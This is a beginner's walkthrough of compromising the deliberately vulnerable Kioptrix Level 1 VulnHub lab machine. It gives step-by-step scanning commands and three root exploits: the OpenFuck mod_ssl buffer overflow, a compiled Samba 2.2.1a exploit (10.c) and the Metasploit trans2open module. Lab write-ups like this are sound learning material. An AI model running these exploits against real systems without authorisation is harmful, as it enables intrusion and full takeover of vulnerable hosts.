# Kioptrix Level 1 - VulnHub Walkthrough

Hello guys,
I decided to try out the Kioptrix Level 1 machine from VulnHub since it is known to be one of the easiest boxes out there. It is perfect for beginners who want to understand the basics of port scanning, enumeration, and exploitation. I thought I would document my journey while rooting this box and share the steps I followed. Hope it helps someone out.

---

## Getting Started

After importing the Kioptrix Level 1 machine into VMware, my first task was to find its IP address. Since it runs in host-only or bridged mode, I scanned my local subnet to detect the active machines.

I used the `netdiscover` tool to detect the live hosts on my network.

```bash
sudo netdiscover -r 192.168.1.1/24
```

From the output, I found that the target machine was assigned the IP address **192.168.1.104**.

Alternatively, I also created a quick bash script to scan and list all live IPs using Nmap.

```bash
#!/bin/bash
nmap -sP 192.168.1.1/24 | grep "for" | cut -d " " -f 5
```

---

## Port Scanning with Nmap

Once I had the IP, I ran a version scan using Nmap to identify open ports and services running on the machine.

```bash
sudo nmap -sV 192.168.1.104 -oN nmap_scan.txt
```

Here are the open ports I found:

* Port 22 running SSH
* Port 80 running HTTP
* Port 111 showing up as RPC
* Port 139 indicating SMB
* Port 443 with HTTPS
* Port 1024 which also looked like a related RPC service

---

## Exploring the Web Server

Since port 80 was open, I visited `http://192.168.1.104` in the browser. The web page loaded but didn’t show anything useful. It looked like a default Apache page.

Next, I used `dirsearch` to fuzz for hidden directories and files on the web server.

```bash
sudo dirsearch -u http://192.168.1.104 --full-url --exclude-status=404,403,401,500
```

Unfortunately, nothing interesting came up. Most of the directories returned 404 or weren’t accessible.

So I moved on to scan the web server for vulnerabilities using Nikto.

```bash
nikto -h http://192.168.1.104
```

Nikto reported that the server was running **Apache 1.3.20 with mod\_ssl 2.8.4** which is vulnerable to **CVE-2002-0082**. That was the first solid lead.

---

## Exploiting mod\_ssl Vulnerability

I searched online and also used `searchsploit` to confirm that the version was vulnerable to a remote buffer overflow attack. The exploit is famously known as **OpenFuck**.

I cloned the exploit code from GitHub.

```bash
git clone https://github.com/exploit-inters/OpenFuck.git
cd OpenFuck
make
```

After compiling it, I ran the exploit with the target IP and port 443.

```bash
./OpenFuck 0x6b 192.168.1.104 443 -c 50
```

This gave me a shell on the machine, and when I typed `whoami`, the result was **root**. First root access achieved successfully through mod\_ssl.

---

## Checking RPC Ports

I went back and looked at ports 111 and 1024 which were related to RPC. I ran some enumeration but didn’t find anything valuable through those ports, so I decided to focus on SMB instead.

---

## Enumerating SMB

Using `smbclient`, I attempted to connect anonymously.

```bash
smbclient -L //192.168.1.104 -N
```

This showed two shares: **IPC\$** and **ADMIN\$**.

When I connected to IPC\$ anonymously, it didn’t contain anything of interest. I tried accessing ADMIN\$ as well, but it required credentials and access was denied.

---

## Finding SMB Version

To find out more about the SMB service, I used Metasploit to detect the Samba version.

```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.104
run
```

Metasploit confirmed that the service was running **Samba 2.2.1a**, which is known to be vulnerable.

---

## Exploiting Samba

I looked up exploits for Samba 2.2.1a using `searchsploit` and found a few. One of them was a C file named **10.c** located in the exploitdb folder.

```bash
searchsploit -p 10.c
cd /usr/share/exploitdb/exploits/multiple/remote
gcc -o exploit 10.c
./exploit -b 0 192.168.1.104
```

I ran the compiled exploit and again got **root shell access**. That made it the second successful way to compromise the machine.

---

## Trying Metasploit for Samba

Just for fun, I went ahead and tried the Metasploit module **trans2open**, which also targets Samba vulnerabilities.

```bash
use exploit/linux/samba/trans2open
set RHOST 192.168.1.104
set PAYLOAD cmd/unix/interact
run
```

And it worked again — another root shell. That made it the third method I used to get access on this machine.

I changed the root password from this session and logged in directly with `username = root` and my new password. Everything worked perfectly.

---

## Final Thoughts

This machine is a great choice for beginners. It helped me practice:

* Host discovery
* Port scanning
* Web enumeration
* Service exploitation using both manual methods and Metasploit

I managed to get root using three different techniques:

1. Apache mod\_ssl buffer overflow using OpenFuck
2. Samba 2.2.1a buffer overflow via C exploit
3. Metasploit Samba trans2open module

Overall, it was a solid learning experience and a fun machine to hack.

---

**Author:** Kakaxh1
**Email:** [kkaxh1.009720@gmail.com](mailto:kkaxh1.009720@gmail.com)

